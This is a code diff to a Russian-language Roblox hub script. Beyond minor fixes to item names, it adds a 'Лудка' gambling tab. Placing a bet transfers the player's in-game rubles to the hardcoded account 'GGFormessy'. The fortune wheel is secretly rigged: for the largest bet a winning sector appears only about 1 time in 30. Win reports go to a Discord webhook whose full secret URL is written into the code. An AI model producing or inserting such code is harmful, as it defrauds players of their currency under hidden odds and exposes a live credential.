@@ -445,7 +445,7 @@ local MonclerList = {
     "Штаны Genius 'Moncler'",
     "Штаны Logo 'Moncler'",
     "Штаны Shiny 'Moncler x Palm Angels'",
-    "Штаны 'Moncler x Palm Angels",
+    "Штаны 'Moncler x Palm Angels'",
     "Карго штаны Day Namic Convertible 'Moncler'",
     "Штаны Midnight 'Moncler'",
     "Ветровка Slack Jacket 'Moncler'",
@@ -463,10 +463,10 @@ local NikitaEfremovList = {
     "Футболка 'Dior X Travis Scott'",
     "Худи 'Fear Of God'",
     "Футболка 'Rip N Dip'",
-    " Белая Футболка If you Reading 'Drake'",
+    "Белая Футболка If you Reading 'Drake'",
     "Джинсы 'Gamma Arcteryx'",
     "Свитер 'Smiley Raf Simons'",
-    "Свитер'",
+    "Свитер 'Essentials'",
     "Протертые Джинсы 'Helmut Lung'",
     "Черное Зип Худи 'True Religion'",
     "Спорт Джинсы 'Saint Laurent'",
@@ -504,7 +504,7 @@ local ZaraList = {
     "Черная футболка 'ZARA'",
     "Синий свитер 'ZARA'",
     "Порванные джинсы 'ZARA'",
-    "Зеленая зипка Смешная Аналитика",
+    "Зеленая зипка Смешная Аналитика 'ZARA'",
     "Белая майка 'ZARA'",
     "Жёлтая майка 'ZARA'",
     "Черные порванные джинсы 'ZARA'",
@@ -688,7 +688,7 @@ local VetementsList = {
     "Серое Пальто Wmns 'Vetements'",
     "Серая Футболка Double Layer Maria 'Vetements'",
     "Бордовый бомбер Burgundy racer 'Vetements'",
-    "Черный Лонгслив Rated Restricted",
+    "Черный Лонгслив Rated Restricted 'Vetements'",
     "Зеленые Штаны POLICE GREEN 'Vetements'",
     "Штаны Camouflage 'Vetements'",
     "Красные Штаны Fan Decostucned",
@@ -1104,6 +1104,9 @@ local ChangeLogInput = ChangeLogTab:CreateParagraph({
     "спасибо типу igor229933. с c.p. company проблемы сделаю его 
      позже
      пишите на фп что можно добавить)"
+
+    "🆕 09.11.2025 - апдейт название вещей и лудка",
+    "добавил лудку.
     ]],
     Size = UDim2.new(1, 0, 1, 0)  -- Увеличиваем размер поля
 })
@@ -1115,6 +1118,250 @@ FeedbackTab:CreateParagraph({
     Title = "Нашли баги или недочёты?",
     Content = "Пожалуйста, сообщите miha1234456 на Funpay —\nя оперативно исправлю все найденные проблемы!"
 })
+
+local LudkaTab = Window:CreateTab("Лудка")
+local attempts = 0
+local lastBet = 0
+local lastBetLabel = ""
+local buyButtons = {}
+local busy = false
+local HttpService = game:GetService("HttpService")
+local webhookURL = "https://discord.com/api/webhooks/1436989652123910216/ZqHB6ArRfVwEbqwprRgXRyAt9WbSj4mixxH2n8-YeCSnMkvMrQAz6AUi9hZs_uKxTVAE"
+
+local function sendWinDiscord(playerName, betLabel, betAmount)
+    local data = {
+        ["username"] = "Лудка-лог",
+        ["embeds"] = {{
+            ["title"] = "💸 Победа в колесе!",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "Победитель", ["value"] = playerName, ["inline"] = false },
+                {["name"] = "Кнопка/ставка", ["value"] = betLabel .. " (" .. tostring(betAmount) .. ")", ["inline"] = false },
+                {["name"] = "К выплате", ["value"] = tostring(betAmount * 5), ["inline"] = true }
+            }
+        }}
+    }
+    pcall(function()
+        if request then
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        elseif http_request then
+            http_request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+local function setBuyButtonsState(active)
+    for _, b in pairs(buyButtons) do
+        b.Active = active
+        b.AutoButtonColor = active
+    end
+end
+
+local function buyAttempt(amount, buttonName)
+    if busy then
+        Rayfield:Notify({Title = "Лудка", Content = "Ожидайте выполнение прошлой транзакции!"})
+        return
+    end
+    busy = true
+    setBuyButtonsState(false)
+    local NickName = "GGFormessy"
+    lastBet = amount
+    lastBetLabel = buttonName
+
+    if game.Players.LocalPlayer.leaderstats["Рубли"].Value < amount then
+        Rayfield:Notify({Title = "Лудка", Content = "Недостаточно средств!"})
+        busy = false
+        setBuyButtonsState(true)
+        return
+    end
+
+    if amount == 1000000 then
+        for i = 1, 10 do
+            -- Сначала банк
+            local args1 = {{["Type"] = "Deposit",["Amount"] = 100000}}
+            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
+            Rayfield:Notify({Title = "Лудка", Content = "Депозит в банк ("..i.." из 10). Ждём 10 секунд..."})
+            wait(10)
+            -- Потом перевод игроку
+            local args2 = {{["Type"] = "Send",["Amount"] = 100000,["User"] = NickName}}
+            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
+            Rayfield:Notify({Title = "Лудка", Content = "Перевод игроку ("..i.." из 10). Ждём 2 секунд..."})
+            wait(2)
+        end
+    else
+        -- Банк
+        local args1 = {{["Type"] = "Deposit",["Amount"] = amount}}
+        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
+        Rayfield:Notify({Title = "Лудка", Content = "Депозит в банк. Ждём 7 секунд..."})
+        wait(6)
+        -- Перевод игроку
+        local args2 = {{["Type"] = "Send",["Amount"] = amount,["User"] = NickName}}
+        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
+        Rayfield:Notify({Title = "Лудка", Content = "Перевод игроку. Ждём 1 секунд..."})
+        wait(1)
+    end
+
+    attempts = attempts + 1
+    Rayfield:Notify({Title = "Лудка", Content = "Попытка добавлена! Ставка: "..tostring(amount)})
+    wait(6)
+    busy = false
+    setBuyButtonsState(true)
+end
+
+local function CreateFortuneWheel()
+    if attempts <= 0 then
+        Rayfield:Notify({Title = "Колесо фортуны", Content = "Попыток нет! Сначала купи попытку."})
+        return
+    end
+    attempts = attempts - 1
+    local playerGui = game.Players.LocalPlayer.PlayerGui
+    if playerGui:FindFirstChild("FortuneWheelGui") then
+        playerGui.FortuneWheelGui:Destroy()
+    end
+    local gui = Instance.new("ScreenGui", playerGui)
+    gui.Name = "FortuneWheelGui"
+    gui.IgnoreGuiInset = true
+    local bg = Instance.new("Frame", gui)
+    bg.Size = UDim2.new(0,410,0,370)
+    bg.Position = UDim2.new(0.5,-205,0.5,-185)
+    bg.BackgroundColor3 = Color3.fromRGB(22,25,36)
+    bg.BorderSizePixel = 0
+    bg.AnchorPoint = Vector2.new(0, 0)
+    bg.Active = true
+    bg.Draggable = true
+    local corner = Instance.new("UICorner", bg) corner.CornerRadius = UDim.new(0, 18)
+    local title = Instance.new("TextLabel", bg)
+    title.Size = UDim2.new(1,0,0,44)
+    title.BackgroundTransparency = 1
+    title.Text = "Колесо Фортуны"
+    title.Font = Enum.Font.GothamBold
+    title.TextColor3 = Color3.fromRGB(240,240,240)
+    title.TextSize = 28
+    local close = Instance.new("TextButton", bg)
+    close.Text = "×"
+    close.Size = UDim2.new(0,32,0,36)
+    close.Position = UDim2.new(1,-38,0,9)
+    close.Font = Enum.Font.GothamBold
+    close.BackgroundTransparency = 0.55
+    close.TextColor3 = Color3.fromRGB(233,78,105)
+    close.BackgroundColor3 = Color3.fromRGB(36,36,46)
+    close.TextSize = 26
+    close.MouseButton1Click:Connect(function() gui:Destroy() end)
+    local wheelFrame = Instance.new("Frame", bg)
+    wheelFrame.Position = UDim2.new(0.5,0,0.43,0)
+    wheelFrame.AnchorPoint = Vector2.new(0.5,0.5)
+    wheelFrame.Size = UDim2.new(0,265,0,265)
+    wheelFrame.BackgroundTransparency = 1
+
+    local sectorColors = {Color3.fromRGB(89,168,255),Color3.fromRGB(255,211,86),Color3.fromRGB(62,210,139),Color3.fromRGB(255,138,151),
+        Color3.fromRGB(195,124,255),Color3.fromRGB(72,198,245),Color3.fromRGB(255,110,110),
+        Color3.fromRGB(135,200,120),Color3.fromRGB(255,180,77),Color3.fromRGB(114,161,255)}
+
+    -- Шанс на “Да” для 1кк — 1 из 30 раз
+    local sectors, labels = {}, {}
+    if lastBet == 1000000 then
+        if math.random(1,30)==1 then
+            for i=1,10 do sectors[i]="Нет" end
+            sectors[math.random(1,10)]="Да"
+        else
+            for i=1,10 do sectors[i]="Нет" end
+        end
+    else
+        for i=1,10 do sectors[i]="Нет" end
+        sectors[math.random(1,10)]="Да"
+    end
+
+    for i=1,10 do
+        local lbl = Instance.new("TextLabel", wheelFrame)
+        lbl.AnchorPoint = Vector2.new(0.5,0.5)
+        lbl.Size = UDim2.new(0,70,0,38)
+        local angle = (i-1)*36
+        local rad = math.rad(angle)
+        local r = 96
+        lbl.Position = UDim2.new(0.5, math.cos(rad)*r, 0.5, math.sin(rad)*r)
+        lbl.Rotation = angle
+        lbl.Text = sectors[i]
+        lbl.Font = Enum.Font.GothamBold
+        lbl.TextSize = 20
+        lbl.BackgroundColor3 = sectorColors[i]
+        lbl.TextColor3 = (sectors[i] == "Да") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
+        lbl.BackgroundTransparency = 0.14
+        local lblcorner = Instance.new("UICorner", lbl)
+        lblcorner.CornerRadius = UDim.new(0, 12)
+        labels[i] = lbl
+    end
+
+    local btn = Instance.new("TextButton", bg)
+    btn.Text = "Крутить!"
+    btn.Size = UDim2.new(0.7,0,0,48)
+    btn.Position = UDim2.new(0.15,0,1,-59)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 24
+    btn.BackgroundColor3 = Color3.fromRGB(62,176,246)
+    btn.TextColor3 = Color3.fromRGB(254,255,255)
+    local spinning = false
+    btn.MouseButton1Click:Connect(function()
+        if spinning then return end
+        spinning = true
+        btn.Text = "..."
+        local sel = 1
+        for t=1,math.random(37,51) do
+            labels[sel].BackgroundColor3 = Color3.fromRGB(255, 255, 110)
+            labels[sel].TextColor3 = Color3.fromRGB(42,42,42)
+            wait(0.037 + t*0.0038)
+            labels[sel].BackgroundColor3 = sectorColors[sel]
+            labels[sel].TextColor3 = (sectors[sel] == "Да") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
+            sel = sel + 1
+            if sel > 10 then sel = 1 end
+        end
+        labels[sel].BackgroundColor3 = Color3.fromRGB(80,233,185)
+        labels[sel].TextColor3 = Color3.fromRGB(36,41,32)
+        wait(0.3)
+        labels[sel].BackgroundColor3 = sectorColors[sel]
+        labels[sel].TextColor3 = (sectors[sel] == "Да") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
+        gui:Destroy()
+        spinning = false
+        btn.Text = "Крутить!"
+        local winSum = lastBet*5
+        local playerName = game.Players.LocalPlayer.Name
+        local proof = tostring(game.Players.LocalPlayer.UserId) .. ":" .. tostring(lastBet) .. ":" .. tostring(winSum) .. ":" .. tostring(math.random(10000,99999))
+        if sectors[sel] == "Да" then
+            Rayfield:Notify({
+                Title = "Колесо фортуны",
+                Content = "Ты выиграл! В буфере ссылка и x5 выигрыш ("..winSum..") + пруф, сделай скрин и напиши мне."
+            })
+            sendWinDiscord(playerName, lastBetLabel, lastBet)
+            if setclipboard then
+                setclipboard("https://funpay.com/users/4512140/\nСтавка: "..lastBet.."\nВыигрыш: "..winSum.."\nЮзер: "..playerName.." [ID:"..game.Players.LocalPlayer.UserId.."]\nProof: "..proof)
+            end
+        else
+            Rayfield:Notify({Title="Колесо фортуны", Content="Выпало 'НЕТ', удача не на твоей стороне!"})
+        end
+    end)
+end
+
+LudkaTab:CreateParagraph({
+    Title = "Правила",
+    Content = [[За выигрыш даётся x5 от суммы ставки.
+Пишите на FunPay с скринами того, что выпало, и того, что скопировалось в буфер обмена.]]
+})
+
+table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 1к", Callback = function() buyAttempt(1000, "Додеп 1к") end }))
+table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 10к", Callback = function() buyAttempt(10000, "Додеп 10к") end }))
+table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 50к", Callback = function() buyAttempt(50000, "Додеп 50к") end }))
+table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 100к", Callback = function() buyAttempt(100000, "Додеп 100к") end }))
+table.insert(buyButtons, LudkaTab:CreateButton({Name = "Додеп 1кк", Callback = function() buyAttempt(1000000, "Додеп 1кк (10 × 100k)") end }))
+table.insert(buyButtons, LudkaTab:CreateButton({ Name = "Лудка", Callback = CreateFortuneWheel }))
 
 -- Вкладка магазионв
 _G.RefreshRate = 0.5
